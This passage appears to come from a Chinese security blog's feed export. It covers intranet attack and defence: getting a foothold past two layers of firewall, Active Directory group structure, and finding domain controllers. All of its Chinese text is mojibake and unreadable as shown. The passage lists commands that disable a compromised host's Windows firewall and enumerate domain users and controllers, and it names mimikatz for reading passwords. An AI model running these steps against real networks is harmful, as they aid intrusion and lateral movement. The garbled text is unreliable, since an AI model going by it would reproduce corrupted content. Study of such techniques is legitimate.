href="#åŒå±‚é˜²ç«å¢™å¼€å¯ä¸Šçº¿è§£å†³æ–¹æ¡ˆï¼š" class="headerlink" title="åŒå±‚é˜²ç«å¢™å¼€å¯ä¸Šçº¿è§£å†³æ–¹æ¡ˆï¼š"></a>åŒå±‚é˜²ç«å¢™å¼€å¯ä¸Šçº¿è§£å†³æ–¹æ¡ˆï¼š</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734773373028-5c999943-8224-45ca-90a4-1266822b1f56.png"></p><p>æ­¤æ—¶åŒåå‘å°±è¡Œä¸è¡Œäº†ï¼Œ å› ä¸º2.22çš„åå‘å‡ºæ˜¯éœ€è¦åˆ°2.11çš„ï¼Œæ­¤æ—¶å¯¹äº2.11æ¥è¯´2.22çš„åå‘å°±ç›¸å½“äºå…¥</p><p>1ã€å‘½ä»¤å…³é—­é˜²ç«å¢™ï¼ˆè¿ä¸Šwebå…³é—­ä»–çš„é˜²ç«å¢™æ­¤æ—¶å¯ä»¥åƒå•å±‚è·³æ¿æœºå¯¹2.22è¿›è¡Œä¸Šçº¿ï¼‰</p><p>åœ¨çœŸå®æƒ…å†µä¸­å°±æ˜¯éƒ½æœ‰é˜²ç«å¢™çš„æƒ…å†µä¸‹ï¼Œå…ˆæ‹¿ä¸‹ä¸€å°æœºå™¨è¿›è¡Œå‘½ä»¤æ‰§è¡Œå…³é—­é˜²ç«å¢™ï¼Œæ‹¿ä¸‹åå°±æ˜¯å•å±‚é˜²ç«å¢™äº†</p><p>2ã€SMBåè®®é€šè®¯ä¸Šçº¿ï¼ˆé»˜è®¤æ”¾è¡Œï¼‰</p><p>3ã€åˆ©ç”¨éš§é“æŠ€æœ¯ä¸Šçº¿ï¼ˆè§„åˆ™å†³å®šï¼‰</p><p>é˜²ç«å¢™å®éªŒï¼ˆé€‚ç”¨åœºæ™¯ï¼‰ï¼š</p><p>1ã€å†…ç½‘æ— åŸŸç¯å¢ƒä¸‹</p><p>2ã€å†…ç½‘æœ‰åŸŸç¯å¢ƒä¸‹ï¼ˆå¼ºåˆ¶ç­–ç•¥åŒæ­¥ï¼‰</p><p>gpupdate&#x2F;force</p><p>Windowsé˜²ç«å¢™å‘½ä»¤ï¼š</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/tomtellyou/p/16300557.html">https://www.cnblogs.com/tomtellyou/p/16300557.html</a></p><p>æŸ¥çœ‹å½“å‰é˜²ç«å¢™çŠ¶æ€ï¼šnetsh advfirewall show allprofiles</p><p>å…³é—­é˜²ç«å¢™ï¼šnetsh advfirewall set allprofiles state off</p><p>å¼€å¯é˜²ç«å¢™ï¼šnetsh advfirewall set allprofiles state on</p><p>æ¢å¤åˆå§‹é˜²ç«å¢™è®¾ç½®ï¼šnetsh advfirewall reset</p><p>å¯ç”¨æ¡Œé¢é˜²ç«å¢™: netsh advfirewall set allprofiles state on</p><p>è®¾ç½®é»˜è®¤è¾“å…¥å’Œè¾“å‡ºç­–ç•¥ï¼šnetsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound</p><p>å¦‚æœè®¾ç½®ä¸ºæ‹’ç»ä½¿ç”¨blockinbound,blockoutbound</p><h3 id="åŸŸé˜²ç«å¢™"><a href="#åŸŸé˜²ç«å¢™" class="headerlink" title="åŸŸé˜²ç«å¢™"></a>åŸŸé˜²ç«å¢™</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734961544506-d07eeec5-ca89-4283-bfe8-63b35017a736.png"></p><p>åœ¨åŸŸæ§åˆ›å»ºä¸ªé˜²ç«å¢™ç¼–è¾‘ä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734963840046-6c95890d-2cd7-4c63-a9e7-267f59f5bda3.png"></p><p>é…ç½®ä¸€ä¸‹é˜²ç«å¢™</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734964118032-63f3404b-7f27-4044-bcc8-6f3b0be7a28d.png">æ”¹æˆé»˜è®¤å€¼ï¼ˆå…¥ç«™æ£€æµ‹å‡ºç«™ä¸æ£€æµ‹ï¼‰</p><h3 id="å¦‚ä½•åˆ¤æ–­ç›®æ ‡æœåŠ¡å™¨å‡ºç½‘åè®®"><a href="#å¦‚ä½•åˆ¤æ–­ç›®æ ‡æœåŠ¡å™¨å‡ºç½‘åè®®" class="headerlink" title="å¦‚ä½•åˆ¤æ–­ç›®æ ‡æœåŠ¡å™¨å‡ºç½‘åè®®"></a>å¦‚ä½•åˆ¤æ–­ç›®æ ‡æœåŠ¡å™¨å‡ºç½‘åè®®</h3><p>icmpå°±çœ‹èƒ½ä¸èƒ½ping</p><p>dnså°±çœ‹åŸŸåèƒ½ä¸èƒ½è§£æ</p><p>sshå°±çœ‹sshè¿æ¥ä¼šä¸ä¼šè¢«é˜»æ­¢</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸŸåŸºç¡€</title>
      <link href="/2024/10/03/%E5%9F%9F/%E5%9F%9F%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/10/03/%E5%9F%9F/%E5%9F%9F%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="åŸŸçŸ¥è¯†"><a href="#åŸŸçŸ¥è¯†" class="headerlink" title="åŸŸçŸ¥è¯†"></a>åŸŸçŸ¥è¯†</h2><p><img src="https://image.baidu.com/search/down?url=https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734577556466-cb10f698-06dd-46f7-bf69-5fdaddac9a67.png"><br><img src="https://image.baidu.com/search/down?url=https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734577562443-33a590cd-f9fb-4fab-88f8-79d2370e87dc.png"></p><p><img src="https://image.baidu.com/search/down?url=https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734577568404-a29634f7-b743-44af-bdb2-47ef3521360b.png"></p><p><img src="https://image.baidu.com/search/down?url=https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734577573678-73369367-1afb-41e4-97af-b06050405889.png"></p><p><img src="https://image.baidu.com/search/down?url=https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734577581620-45aac3c4-76c5-4248-8cb1-06583df0c520.png"></p><h3 id="å·¥ä½œç»„ï¼š"><a href="#å·¥ä½œç»„ï¼š" class="headerlink" title="å·¥ä½œç»„ï¼š"></a>å·¥ä½œç»„ï¼š</h3><p>å°†ä¸åŒçš„è®¡ç®—æœºæŒ‰ç…§åŠŸèƒ½åˆ†åˆ«åˆ—å…¥ä¸åŒçš„å·¥ä½œç»„ã€‚æƒ³è¦è®¿é—®æŸä¸ªéƒ¨é—¨çš„èµ„æºï¼Œåªè¦åœ¨â€œç½‘ç»œâ€é‡Œé¢åŒå‡»è¯¥éƒ¨é—¨çš„å·¥ä½œç»„åã€‚å·¥ä½œç»„å°±åƒä¸€ä¸ªå¯ä»¥è‡ªç”±è¿›å…¥å’Œé€€å‡ºçš„ç¤¾å›¢ï¼Œæ–¹ä¾¿åŒç»„çš„è®¡ç®—æœºç›¸äº’è®¿é—®ï¼Œå·¥ä½œç»„æ²¡æœ‰é›†ä¸­ç®¡ç†ä½œç”¨ï¼Œå·¥ä½œç»„é‡Œçš„è®¡ç®—æœºéƒ½æ˜¯ç›¸äº’å¯¹ç­‰çš„ï¼ˆå³æ²¡æœ‰æœåŠ¡å™¨å’Œå®¢æˆ·æœºä¹‹åˆ†ï¼‰ã€‚å¯¹å±€åŸŸç½‘ä¸­çš„è®¡ç®—æœºè¿›è¡Œåˆ†ç±»ï¼Œä½¿å¾—ç½‘ç»œæ›´æœ‰åºã€‚è®¡ç®—æœºçš„ç®¡ç†ä¾ç„¶æ˜¯å„è‡ªä¸ºæ”¿ï¼Œæ‰€æœ‰è®¡ç®—æœºä¾ç„¶æ˜¯å¯¹ç­‰çš„ï¼Œæ¾æ•£ä¼šå‘˜åˆ¶ï¼Œå¯ä»¥éšæ„åŠ å…¥å’Œé€€å‡ºï¼Œä¸”ä¸åŒå·¥ä½œç»„ä¹‹é—´çš„å…±äº«èµ„æºå¯ä»¥ç›¸äº’è®¿é—®ã€‚</p><h3 id="å†…ç½‘åŸŸï¼š"><a href="#å†…ç½‘åŸŸï¼š" class="headerlink" title="å†…ç½‘åŸŸï¼š"></a>å†…ç½‘åŸŸï¼š</h3><p>åˆ†ç±»ï¼šå•åŸŸã€å­åŸŸã€çˆ¶åŸŸã€åŸŸæ ‘ã€åŸŸæ£®æ—ã€DNSåŸŸåæœåŠ¡å™¨</p><p>â€œåŸŸâ€æ˜¯ä¸€ä¸ªæœ‰å®‰å…¨è¾¹ç•Œçš„è®¡ç®—æœºç»„åˆï¼ˆä¸€ä¸ªåŸŸä¸­çš„ç”¨æˆ·æ— æ³•è®¿é—®å¦ä¸€ä¸ªåŸŸä¸­çš„èµ„æºï¼‰ï¼ŒåŸŸå†…èµ„æºç”±ä¸€å°åŸŸæ§åˆ¶å™¨ï¼ˆDomain Controllerï¼ŒDCï¼‰é›†ä¸­ç®¡ç†ï¼Œç”¨æˆ·åå’Œå¯†ç æ˜¯æ”¾åœ¨åŸŸæ§åˆ¶å™¨å»éªŒè¯çš„ã€‚</p><p>ä¼˜ç‚¹ï¼šé€šè¿‡ç»„ç­–ç•¥æ¥ç»Ÿä¸€ç®¡ç†ã€‚</p><h4 id="å•åŸŸ"><a href="#å•åŸŸ" class="headerlink" title="å•åŸŸ"></a>å•åŸŸ</h4><p>å•åŸŸï¼šå³åªæœ‰ä¸€ä¸ªåŸŸçš„ç½‘ç»œç¯å¢ƒï¼Œä¸€èˆ¬éœ€è¦ä¸¤å°DCï¼Œä¸€å°DCï¼Œå¦ä¸€å°å¤‡ç”¨DCï¼ˆå®¹ç¾ï¼‰</p><p>dnså¯èƒ½å°±æ˜¯åŸŸæ§</p><h4 id="çˆ¶å­åŸŸ"><a href="#çˆ¶å­åŸŸ" class="headerlink" title="çˆ¶å­åŸŸ"></a>çˆ¶å­åŸŸ</h4><p>çˆ¶å­åŸŸï¼šç±»æ¯”å…¬å¸æ€»éƒ¨å’Œå…¬å¸åˆ†éƒ¨çš„å…³ç³»ï¼Œæ€»éƒ¨çš„åŸŸç§°ä¸ºçˆ¶åŸŸï¼Œå„åˆ†éƒ¨çš„åŸŸç§°ä¸ºè¯¥åŸŸçš„å­åŸŸã€‚ä½¿ç”¨çˆ¶å­åŸŸçš„å¥½å¤„ï¼š</p><p>â€¢ å‡å°äº†åŸŸä¹‹é—´ä¿¡æ¯äº¤äº’çš„å‹åŠ›ï¼ˆåŸŸå†…ä¿¡æ¯äº¤äº’ä¸ä¼šå‹ç¼©ï¼ŒåŸŸé—´ä¿¡æ¯äº¤äº’å¯å‹ç¼©ï¼‰</p><p>â€¢ ä¸åŒçš„å­åŸŸå¯ä»¥æŒ‡å®šç‰¹å®šçš„å®‰å…¨ç­–ç•¥</p><p>çˆ¶å­åŸŸä¸­åŸŸåä½¿ç”¨ä¸€ä¸ª.è¡¨ç¤ºä¸€ä¸ªå±‚æ¬¡ï¼Œç±»ä¼¼äºDNSåŸŸåè¡¨ç¤ºæ–¹å¼ï¼Œå­åŸŸåªèƒ½ä½¿ç”¨çˆ¶åŸŸçš„åå­—ä½œä¸ºåŸŸååç¼€</p><h4 id="åŸŸæ ‘"><a href="#åŸŸæ ‘" class="headerlink" title="åŸŸæ ‘"></a>åŸŸæ ‘</h4><p>åŸŸæ ‘ï¼šå¤šä¸ªåŸŸé€šè¿‡å»ºç«‹ä¿¡ä»»å…³ç³»ç»„æˆçš„é›†åˆã€‚è‹¥ä¸¤ä¸ªåŸŸä¹‹é—´éœ€è¦ç›¸äº’è®¿é—®ï¼Œéœ€è¦å»ºç«‹ä¿¡ä»»å…³ç³»ï¼ˆTrust Relationï¼‰ï¼Œé€šè¿‡ä¿¡ä»»å…³ç³»å¯ä»¥å°†çˆ¶å­åŸŸè¿æ¥æˆæ ‘çŠ¶ç»“æ„</p><h4 id="åŸŸæ£®æ—"><a href="#åŸŸæ£®æ—" class="headerlink" title="åŸŸæ£®æ—"></a>åŸŸæ£®æ—</h4><p>åŸŸæ£®æ—ï¼šå¤šä¸ªåŸŸæ ‘é€šè¿‡å»ºç«‹ä¿¡ä»»å…³ç³»ç»„æˆçš„é›†åˆã€‚</p><p>åŸŸåæœåŠ¡å™¨ï¼šå®ç°åŸŸååˆ°IPåœ°å€çš„è½¬æ¢ã€‚ç”±äºåŸŸä¸­è®¡ç®—æœºä½¿ç”¨DNSæ¥å®šä½DCã€æœåŠ¡å™¨å’Œå…¶ä»–è®¡ç®—æœºçš„ï¼Œæ‰€ä»¥åŸŸçš„åå­—å°±æ˜¯DNSåŸŸçš„åå­—ã€‚</p><p>å†…ç½‘æ¸—é€ä¸­ï¼Œå¤§éƒ½æ˜¯é€šè¿‡å¯»æ‰¾DNSæœåŠ¡å™¨æ¥ç¡®å®šåŸŸæ§åˆ¶å™¨ä½ç½®ï¼ˆå› ä¸ºDNSæœåŠ¡å™¨å’ŒåŸŸæ§åˆ¶å™¨é€šå¸¸é…ç½®åœ¨ä¸€å°æœºå™¨ä¸Šï¼‰</p><h3 id="åŸŸå†…æƒé™ï¼š"><a href="#åŸŸå†…æƒé™ï¼š" class="headerlink" title="åŸŸå†…æƒé™ï¼š"></a>åŸŸå†…æƒé™ï¼š</h3><p>â€¢ åŸŸæœ¬åœ°ç»„ï¼š</p><p>â€¢ å¤šåŸŸç”¨æˆ·è®¿é—®å•åŸŸèµ„æº</p><p>â€¢ ï¼ˆè®¿é—®åŒä¸€ä¸ªåŸŸï¼‰ï¼Œä¸»è¦ç”¨äºæˆäºˆæœ¬åŸŸå†…èµ„æºçš„è®¿é—®æƒé™ï¼Œå¯ä»¥ä»ä»»ä½•åŸŸä¸­æ·»åŠ ç”¨æˆ·è´¦å·ã€é€šç”¨ç»„å’Œå…¨å±€ç»„ã€‚åŸŸæœ¬åœ°ç»„æ— æ³•åµŒå¥—åœ¨å…¶ä»–ç»„ä¸­</p><p>â€¢ å…¨å±€ç»„ï¼š</p><p>â€¢ å•åŸŸç”¨æˆ·è®¿é—®å¤šåŸŸèµ„æº</p><p>â€¢ ï¼ˆå¿…é¡»æ˜¯åŒä¸€ä¸ªåŸŸä¸­çš„ç”¨æˆ·ï¼‰ï¼Œåªèƒ½åœ¨åˆ›å»ºè¯¥å…¨å±€ç»„çš„åŸŸä¸­æ·»åŠ ç”¨æˆ·å’Œå…¨å±€ç»„ï¼Œä½†å¯ä»¥åœ¨åŸŸæ£®æ—ä¸­çš„ä»»ä½•åŸŸå†…æŒ‡æ´¾æƒé™ï¼Œä¹Ÿå¯ä»¥åµŒå¥—åœ¨å…¶ä»–ç»„ä¸­</p><p>â€¢ é€šç”¨ç»„ï¼šå¤šåŸŸç”¨æˆ·è®¿é—®å¤šåŸŸèµ„æºï¼Œæˆå‘˜ä¿¡æ¯ä¸ä¿å­˜åœ¨åŸŸæ§åˆ¶å™¨ä¸­ï¼Œè€Œæ˜¯ä¿å­˜åœ¨å…¨å±€ç¼–å½•ï¼ˆGCï¼‰ä¸­ï¼Œä»»ä½•å˜åŒ–éƒ½ä¼šå¯¼è‡´å…¨æ—å¤åˆ¶</p><p>åŸŸæœ¬åœ°ç»„ï¼šæ¥è‡ªå…¨æ—ä½œç”¨äºæœ¬åŸŸ</p><p>å…¨å±€ç»„ï¼šæ¥è‡ªæœ¬åŸŸä½œç”¨äºå…¨æ—</p><p>é€šç”¨ç»„ï¼šæ¥è‡ªå…¨æ—ä½œç”¨äºå…¨æ—</p><p>æœ¬åœ°åŸŸç»„çš„æƒé™</p><p>Administratorsï¼ˆç®¡ç†å‘˜ç»„ï¼‰ â€”â€”â€”â€”æœ€é‡è¦çš„æƒé™</p><p>Remote Desktop Usersï¼ˆè¿œç¨‹ç™»å½•ç»„ï¼‰</p><p>Print Operatorsï¼ˆæ‰“å°æœºæ“ä½œå‘˜ç»„ï¼‰</p><p>Account Operatorsï¼ˆå¸å·æ“ä½œå‘˜ç»„ï¼‰</p><p>Server Operatersï¼ˆæœåŠ¡å™¨æ“ä½œå‘˜ç»„ï¼‰</p><p>Backup Operatorsï¼ˆå¤‡ä»½æ“ä½œå‘˜ç»„ï¼‰</p><p>å…¨å±€ç»„ã€é€šç”¨ç»„çš„æƒé™</p><p>Domain Adminsï¼ˆåŸŸç®¡ç†å‘˜ç»„ï¼‰â€”â€”â€”â€”æœ€æœ€æœ€é‡è¦çš„æƒé™ï¼Œä¸€èˆ¬æ¥è¯´åŸŸæ¸—é€æ˜¯çœ‹é‡è¿™ä¸ª</p><p>Enterprise Adminsï¼ˆä¼ä¸šç³»ç»Ÿç®¡ç†å‘˜ç»„ï¼‰â€”â€”â€”â€”æœ€é‡è¦çš„æƒé™ï¼Œå…¶æ¬¡æ˜¯å»çœ‹é‡è¿™ä¸ªæƒé™</p><p>Schema Adminsï¼ˆæ¶æ„ç®¡ç†å‘˜ç»„ï¼‰â€”â€”â€”â€”æœ€é‡è¦çš„æƒé™</p><p>Domain Usersï¼ˆåŸŸç”¨æˆ·ç»„)</p><p>é€šå¸¸DNSæœåŠ¡å™¨ä¸åŸŸæ§åˆ¶å™¨ä¼šåœ¨åŒä¸€å°æœºå™¨ä¸Š</p><p>ä¸€ä¸ªåŸŸå†…è‡³å°‘éœ€è¦ä¸¤å°DCï¼Œéœ€è¦ä¸€å°ç”¨ä½œå¤‡ä»½</p><h3 id="A-G-DL-Pç­–ç•¥ï¼š"><a href="#A-G-DL-Pç­–ç•¥ï¼š" class="headerlink" title="A-G-DL-Pç­–ç•¥ï¼š"></a>A-G-DL-Pç­–ç•¥ï¼š</h3><p>Aï¼šç”¨æˆ·è´¦æˆ·</p><p>Gï¼šå…¨å±€ç»„</p><p>DLï¼šåŸŸæœ¬åœ°ç»„</p><p>Pï¼šè®¸å¯ï¼Œèµ„æºæƒé™</p><p>å…ˆå°†ç”¨æˆ·è´¦å·æ·»åŠ è‡³å…¨å±€ç»„ä¸­ï¼Œå†å°†å…¨å±€ç»„æ·»åŠ è‡³åŸŸæœ¬åœ°ç»„ï¼Œä¸ºåŸŸæœ¬åœ°ç»„åˆ†é…èµ„æºæƒé™ã€‚</p><p>1ã€åŸŸç¯å¢ƒåº”ç”¨</p><p>â€¢ è´¦å·é›†ä¸­ç®¡ç†</p><p>â€¢ è½¯ä»¶é›†ä¸­ç®¡ç†</p><p>â€¢ ç¯å¢ƒé›†ä¸­ç®¡ç†</p><p>â€¢ å¢å¼ºç»Ÿä¸€å®‰å…¨æ€§</p><p>2ã€åŸŸç¯å¢ƒæ¶æ„</p><p>åŸŸæ§åˆ¶å™¨</p><p>æˆå‘˜æœåŠ¡å™¨</p><p>å®¢æˆ·æœº</p><p>ç‹¬ç«‹æœåŠ¡å™¨</p><p>è§å›¾ï¼šï¼ˆå•åŸŸï¼Œçˆ¶åŸŸï¼Œå­åŸŸï¼ŒåŸŸæ ‘ï¼ŒåŸŸæ£®æ—ï¼‰</p><p>å•åŸŸæ˜¯æŒ‡ç½‘ç»œç¯å¢ƒä¸­åªæœ‰ä¸€ä¸ªåŸŸï¼Œå»ºç«‹ä¸€ä¸ªå•ç‹¬çš„åŸŸè¶³ä»¥ã€‚</p><p>çˆ¶å­åŸŸåœ¨ä¸€ä¸ªåŸŸä¸­åˆ’åˆ†å‡ºå¤šä¸ªåŸŸï¼Œè¢«åˆ’åˆ†çš„åŸŸä¸ºçˆ¶åŸŸï¼Œåˆ’åˆ†å‡ºæ¥çš„åŸŸä¸ºå­åŸŸã€‚</p><p>åŸŸæ ‘ä¸­çš„å‘½åç©ºé—´å…·æœ‰è¿ç»­æ€§ï¼Œå¹¶ä¸”åŸŸåå±‚æ¬¡è¶Šæ·±ï¼Œçº§åˆ«è¶Šä½ã€‚</p><p>åŸŸæ—æ˜¯æŒ‡ä¸€ä¸ªæˆ–å¤šä¸ªæ²¡æœ‰å½¢æˆè¿ç»­åå­—ç©ºé—´çš„åŸŸæ ‘ç»„æˆçš„åŸŸæ ‘é›†åˆã€‚</p><p>3ã€åŸŸç¯å¢ƒæ­å»º</p><p>å‡†å¤‡å·¥ä½œï¼š</p><p>å…³é—­é˜²ç«å¢™å¹¶æ”¹è®¡ç®—æœºå</p><p>è®¡ç®—æœºç½‘ç»œé…ç½®é™æ€IPå’ŒDNS</p><p>å®‰è£…å·¥ä½œï¼š</p><p>DCå®‰è£…åŸŸæ§å’ŒDNSæœåŠ¡</p><p>æå‡åˆ°DCåŸŸæ§é…ç½®åŸŸå</p><p>åŠ å…¥å·¥ä½œï¼š</p><p>DCä¸Šæ·»åŠ åŸŸå†…ç”¨æˆ·</p><p>ä¿®æ”¹ä¸»æœºåç§°åŠåŠ å…¥åŸŸ</p><p>4ã€åŸŸç¯å¢ƒå·®å¼‚</p><p>åŠ å…¥ä¸»æœºå­˜åœ¨åŸŸå†…å’ŒåŸŸå¤–ï¼š</p><p>ç”¨æˆ·åˆ‡æ¢</p><p>åŠ å…¥ä¸»æœºåŸŸå†…ç”¨æˆ·è¢«æ§åˆ¶</p><p>åŸŸå†…æƒé™ï¼š</p><p>åŸŸæœ¬åœ°ç»„ï¼šæ¥è‡ªå…¨æ—ä½œç”¨äºæœ¬åŸŸ</p><p>å…¨å±€ç»„ï¼šæ¥è‡ªæœ¬åŸŸä½œç”¨äºå…¨æ—</p><p>é€šç”¨ç»„ï¼šæ¥è‡ªå…¨æ—ä½œç”¨äºå…¨æ—</p><p>æœ¬åœ°åŸŸç»„çš„æƒé™</p><p>Administratorsï¼ˆç®¡ç†å‘˜ç»„ï¼‰ â€”â€”â€”â€”æœ€é‡è¦çš„æƒé™</p><p>Remote Desktop Usersï¼ˆè¿œç¨‹ç™»å½•ç»„ï¼‰</p><p>Print Operatorsï¼ˆæ‰“å°æœºæ“ä½œå‘˜ç»„ï¼‰</p><p>Account Operatorsï¼ˆå¸å·æ“ä½œå‘˜ç»„ï¼‰</p><p>Server Operatersï¼ˆæœåŠ¡å™¨æ“ä½œå‘˜ç»„ï¼‰</p><p>Backup Operatorsï¼ˆå¤‡ä»½æ“ä½œå‘˜ç»„ï¼‰</p><p>å…¨å±€ç»„ã€é€šç”¨ç»„çš„æƒé™</p><p>Domain Adminsï¼ˆåŸŸç®¡ç†å‘˜ç»„ï¼‰â€”â€”â€”â€”æœ€æœ€æœ€é‡è¦çš„æƒé™ï¼Œä¸€èˆ¬æ¥è¯´åŸŸæ¸—é€æ˜¯çœ‹é‡è¿™ä¸ª</p><p>Enterprise Adminsï¼ˆä¼ä¸šç³»ç»Ÿç®¡ç†å‘˜ç»„ï¼‰â€”â€”â€”â€”æœ€é‡è¦çš„æƒé™ï¼Œå…¶æ¬¡æ˜¯å»çœ‹é‡è¿™ä¸ªæƒé™</p><p>Schema Adminsï¼ˆæ¶æ„ç®¡ç†å‘˜ç»„ï¼‰â€”â€”â€”â€”æœ€é‡è¦çš„æƒé™</p><p>Domain Usersï¼ˆåŸŸç”¨æˆ·ç»„)</p><p>A-G-DL-Pç­–ç•¥ï¼š</p><p>A ä»£è¡¨ç”¨æˆ·è´¦å·ï¼ˆAccountï¼‰ã€‚</p><p>G ä»£è¡¨å…¨å±€ç»„ï¼ˆGlobal Groupï¼‰ã€‚</p><p>DL ä»£è¡¨åŸŸæœ¬åœ°ç»„ï¼ˆDomain Local Groupï¼‰ã€‚</p><p>P ä»£è¡¨èµ„æºè®¿é—®æƒé™ï¼ˆPermissionï¼‰ã€‚</p><p>A-G-DL-Pç­–ç•¥æ˜¯ä¸€ç§å°†ç”¨æˆ·è´¦å·æ·»åŠ åˆ°å…¨å±€ç»„ä¸­ï¼Œç„¶åå°†å…¨å±€ç»„æ·»åŠ åˆ°åŸŸæœ¬åœ°ç»„ä¸­ï¼Œå¹¶ä¸ºåŸŸæœ¬åœ°ç»„åˆ†é…èµ„æºè®¿é—®æƒé™çš„ç­–ç•¥ã€‚è¿™ç§ç­–ç•¥ä½¿å¾—æ¥è‡ªä¸åŒåŸŸçš„ç”¨æˆ·èƒ½å¤Ÿé€šè¿‡å…¨å±€ç»„å’ŒåŸŸæœ¬åœ°ç»„çš„ç»„ç»‡æ–¹å¼ï¼Œè®¿é—®æœ¬åœ°åŸŸä¸­çš„èµ„æºã€‚</p><p>5ã€åŸŸç¯å¢ƒå®‰å…¨</p><p>ä¿¡æ¯æ”¶é›†ï¼šäº†è§£å½“å‰ç½‘ç»œæ¶æ„å’Œæƒé™åˆ†å¸ƒ</p><p>æƒé™æå‡ï¼šå°†å½“å‰æ§åˆ¶æƒé™æå‡è§£å†³é™åˆ¶</p><p>ä»£ç†éš§é“ï¼šè§£å†³å†…ç½‘åŸŸä¸­å‡ºç½‘å’Œé€šè®¯é™åˆ¶</p><p>æ¨ªå‘ç§»åŠ¨ï¼šåˆ©ç”¨æ¼æ´å’Œå£ä»¤ç­‰æ‰©å¤§åç»­æˆ˜æœ</p><p>æƒé™ç»´æŒï¼šæ¤å…¥åé—¨æˆ–ç¥¨æ®ç­‰è¿›è¡Œåç»­æ§åˆ¶</p><h3 id="æ¼”ç¤ºï¼šå•åŸŸ"><a href="#æ¼”ç¤ºï¼šå•åŸŸ" class="headerlink" title="æ¼”ç¤ºï¼šå•åŸŸ"></a>æ¼”ç¤ºï¼šå•åŸŸ</h3><h4 id="1ã€å¦‚ä½•åˆ¤æ–­åœ¨åŸŸå†…"><a href="#1ã€å¦‚ä½•åˆ¤æ–­åœ¨åŸŸå†…" class="headerlink" title="1ã€å¦‚ä½•åˆ¤æ–­åœ¨åŸŸå†…"></a>1ã€å¦‚ä½•åˆ¤æ–­åœ¨åŸŸå†…</h4><p>å¦‚æœåœ¨åŸŸå¤–ï¼Œéœ€è¦åšåŸŸå†…æ¸—é€æµ‹è¯•ï¼Œéœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼ˆ2é€‰1ï¼‰ï¼š</p><p>1ã€å–å¾—ä¸»æœºç³»ç»Ÿæƒé™ï¼ˆadministrator&#x2F;systemï¼‰</p><p>å¯ä»¥ä½¿ç”¨mimikatzç­‰å·¥å…·è¯»å–å¯†ç ï¼Œå†åˆ‡æ¢åˆ°åŸŸå†…è´¦æˆ·</p><p>2ã€å–å¾—ä¸»æœºåŸŸå†…æƒé™</p><p>å› ä¸ºåŠ å…¥åŸŸåï¼Œå—dcæ§åˆ¶</p><p>è½¯ä»¶ç­–ç•¥ ç½‘ç»œç­–ç•¥  æ›´æ”¹ç­–ç•¥</p><p>çœ‹åŸŸå¤–</p><p>whoami</p><p>çœ‹åŸŸå†…ï¼ˆæ²¡æœ‰åŸŸå†…æƒé™æ—¶ä¼šè¢«æ‹’ç»ï¼‰</p><p>net user &#x2F;domain</p><h4 id="2ã€å¦‚ä½•å®šä½åŸŸæ§DC"><a href="#2ã€å¦‚ä½•å®šä½åŸŸæ§DC" class="headerlink" title="2ã€å¦‚ä½•å®šä½åŸŸæ§DC"></a>2ã€å¦‚ä½•å®šä½åŸŸæ§DC</h4><font style="color:rgb(14, 156, 229);">  </font>net time /domain<p>net groupâ€domain controllersâ€ &#x2F;domain</p><p>nltest &#x2F;dsgetdc:åŸŸå</p><p>nltest &#x2F;dclist:åŸŸå</p><p>æˆ–è€…è¿è¡Œcsç­‰å·¥å…·ä¸€äº›æ’ä»¶</p><h4 id="3ã€å¦‚ä½•è·å–å…¶ä»–ä¿¡æ¯"><a href="#3ã€å¦‚ä½•è·å–å…¶ä»–ä¿¡æ¯" class="headerlink" title="3ã€å¦‚ä½•è·å–å…¶ä»–ä¿¡æ¯"></a>3ã€å¦‚ä½•è·å–å…¶ä»–ä¿¡æ¯</h4><p>å…¶ä»–ä¿¡æ¯ï¼šç”¨æˆ·åŠç»„ï¼Œç½‘ç»œæ¶æ„ç­‰</p><p>æ‰‹å·¥å·¥å…·ï¼šå¸¸è§å‘½ä»¤ï¼Œå·¥å…·æ’ä»¶ç­‰</p><h3 id="çˆ¶å­åŸŸ-1"><a href="#çˆ¶å­åŸŸ-1" class="headerlink" title="çˆ¶å­åŸŸ"></a>çˆ¶å­åŸŸ</h3><p><img src="https://image.baidu.com/search/down?url=https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734585880126-f5b28997-165a-4745-956f-97823fe9140d.png"></p><h4 id="1ã€å¦‚ä½•åˆ¤æ–­åœ¨å•åŸŸå†…"><a href="#1ã€å¦‚ä½•åˆ¤æ–­åœ¨å•åŸŸå†…" class="headerlink" title="1ã€å¦‚ä½•åˆ¤æ–­åœ¨å•åŸŸå†…"></a>1ã€å¦‚ä½•åˆ¤æ–­åœ¨å•åŸŸå†…</h4><p>net time &#x2F;domainçœ‹æŒ‡å‘è°</p><h4 id="2ã€å¦‚ä½•åˆ¤æ–­åœ¨çˆ¶å­åŸŸå†…"><a href="#2ã€å¦‚ä½•åˆ¤æ–­åœ¨çˆ¶å­åŸŸå†…" class="headerlink" title="2ã€å¦‚ä½•åˆ¤æ–­åœ¨çˆ¶å­åŸŸå†…"></a>2ã€å¦‚ä½•åˆ¤æ–­åœ¨çˆ¶å­åŸŸå†…</h4><p>å­åŸŸèƒ½çœ‹çˆ¶åŸŸï¼Œä¸èƒ½ç®¡ç†</p><p>net view &#x2F;domain 